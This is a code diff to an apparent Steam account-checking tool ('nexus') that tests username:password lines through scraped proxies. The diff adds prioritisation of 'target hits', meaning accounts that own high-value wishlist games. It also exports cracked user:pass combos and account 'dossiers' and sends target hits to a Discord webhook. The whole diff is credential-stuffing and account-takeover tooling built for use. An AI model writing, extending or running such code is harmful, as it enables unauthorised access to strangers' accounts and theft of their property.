@@ -33,6 +33,7 @@ from nexus.core.proxy_scraper import scrape_fresh_proxies, filter_operational_pr
 from nexus.core.transport import SessionTransportPool
 from nexus.utils.exporter import ResultExporter
 from nexus.utils.discord import DiscordWebhookDispatcher
+from nexus.utils.targets import evaluate_target_account
 
 
 class HeadlessOrchestrator:
@@ -73,6 +74,7 @@ class HeadlessOrchestrator:
         # Metrics
         self.total_lines = 0
         self.checked_count = 0
+        self.target_hit_count = 0
         self.hit_count = 0
         self.two_fa_count = 0
         self.invalid_count = 0
@@ -87,9 +89,10 @@ class HeadlessOrchestrator:
                 with open(CHECKPOINT_FILE, "r", encoding="utf-8") as f:
                     data = json.load(f)
                     self.skip_to_index = data.get("checked", 0)
+                    self.target_hit_count = data.get("target_hits", 0)
                     self.hit_count = data.get("hits", 0)
                     self.two_fa_count = data.get("two_fa", 0)
-                    print(f"\033[93m[CHECKPOINT RESUME] Resuming from record #{self.skip_to_index:,} | Prior Hits: {self.hit_count}\033[0m")
+                    print(f"\033[93m[CHECKPOINT RESUME] Resuming from record #{self.skip_to_index:,} | Target Hits: {self.target_hit_count} | All Paid: {self.hit_count}\033[0m")
             except Exception as e:
                 print(f"[CHECKPOINT NOTICE] Could not load checkpoint: {e}")
 
@@ -100,6 +103,7 @@ class HeadlessOrchestrator:
             data = {
                 "checked": self.checked_count,
                 "total": self.total_lines,
+                "target_hits": self.target_hit_count,
                 "hits": self.hit_count,
                 "two_fa": self.two_fa_count,
                 "timestamp": time.time()
@@ -170,7 +174,8 @@ class HeadlessOrchestrator:
         sys.stdout.write(
             f"\r\033[1;36m[NEXUS]\033[0m "
             f"Checked: \033[1;37m{self.checked_count:,}\033[0m/{total_str} | "
-            f"Hits: \033[1;32m{self.hit_count:,}\033[0m | "
+            f"🎯 Targets: \033[1;32m{self.target_hit_count:,}\033[0m | "
+            f"Hits: \033[1;34m{self.hit_count:,}\033[0m | "
             f"2FA: \033[1;33m{self.two_fa_count:,}\033[0m | "
             f"Speed: \033[1;35m{cpm:,} CPM\033[0m | "
             f"Relays: \033[1;32m{active_relays} live\033[0m (\033[1;33m{cooling_relays} cooling\033[0m) | "
@@ -269,8 +274,26 @@ class HeadlessOrchestrator:
         await self.transport_pool.close_all()
 
         self._save_checkpoint()
-        print("\n\n\033[1;32m[COMPLETE] Validation finished.\033[0m")
-        print(f"Total Processed: {self.checked_count:,} | Hits: {self.hit_count:,} | 2FA: {self.two_fa_count:,}")
+        summary_path = self.exporter.finalize_validation_batch(
+            total_checked=self.checked_count,
+            total_hits=self.hit_count,
+            target_hits=self.target_hit_count,
+            two_fa_count=self.two_fa_count,
+            invalid_count=self.invalid_count,
+            elapsed_sec=time.time() - self.start_time
+        )
+        print("\n\n\033[1;32m═══════════════════════════════════════════════════════════════════\033[0m")
+        print(f"\033[1;32m[COMPLETE] Validation finished. All accounts verified!\033[0m")
+        print(f"Total Processed : {self.checked_count:,}")
+        print(f"Target Hits     : {self.target_hit_count:,} (High-Value Wishlist Games)")
+        print(f"All Paid Hits   : {self.hit_count:,}")
+        print(f"Steam Guard 2FA : {self.two_fa_count:,}")
+        print(f"Invalid Logins  : {self.invalid_count:,}")
+        print(f"\033[1;36m[OUTPUT] Clean Hits File : hits.txt & results/hits.txt\033[0m")
+        print(f"\033[1;36m[OUTPUT] User:Pass Combos: results/hits_combos_only.txt\033[0m")
+        print(f"\033[1;36m[OUTPUT] Full Dossiers   : results/hits_detailed.txt\033[0m")
+        print(f"\033[1;36m[OUTPUT] Summary Report  : {summary_path}\033[0m")
+        print("\033[1;32m═══════════════════════════════════════════════════════════════════\033[0m\n")
 
     async def _worker(self, queue: asyncio.Queue, semaphore: asyncio.Semaphore):
         """Worker task executing individual account authentication handshakes with persistent connection pooling."""
@@ -354,20 +377,32 @@ class HeadlessOrchestrator:
 
                 self.checked_count += 1
 
+                is_target, matched_targets = evaluate_target_account(result)
+                if is_target:
+                    result["matched_targets"] = matched_targets
+
                 # Outcomes
                 if status == "HIT":
                     self.hit_count += 1
-                    print(f"\n\033[1;32m[HIT] {username} | Games: {result.get('total_games', 0)} (Paid: {result.get('paid_games', 0)})\033[0m")
                     self.exporter.record_item_live(result)
-                    if self.dispatcher:
-                        await self.dispatcher.dispatch_hit(result)
+
+                    if is_target:
+                        self.target_hit_count += 1
+                        matched_names = ", ".join([tg.get("name", "") for tg in matched_targets[:3]])
+                        if len(matched_targets) > 3:
+                            matched_names += f" +{len(matched_targets)-3} more"
+                        print(f"\n\033[1;32m[🎯 TARGET HIT] {username} | Matched: [{matched_names}] | Paid Games: {result.get('paid_games', 0)}\033[0m")
+                        self.exporter.record_target_hit(result, matched_targets)
+                        if self.dispatcher:
+                            await self.dispatcher.dispatch_hit(result)
+                    else:
+                        print(f"\n\033[1;34m[PAID HIT] {username} | Paid Games: {result.get('paid_games', 0)} (No Wishlist Target)\033[0m")
+
                 elif status == "2FA_HIT":
-                    self.hit_count += 1
                     self.two_fa_count += 1
-                    print(f"\n\033[1;33m[2FA HIT] {username} | Steam Guard Guarded\033[0m")
+                    print(f"\n\033[1;33m[2FA GUARDED] {username} | Steam Guard Locked (Skipped from Discord)\033[0m")
                     self.exporter.record_item_live(result)
-                    if self.dispatcher:
-                        await self.dispatcher.dispatch_hit(result)
+
                 elif status == "INVALID":
                     self.invalid_count += 1
                 else:
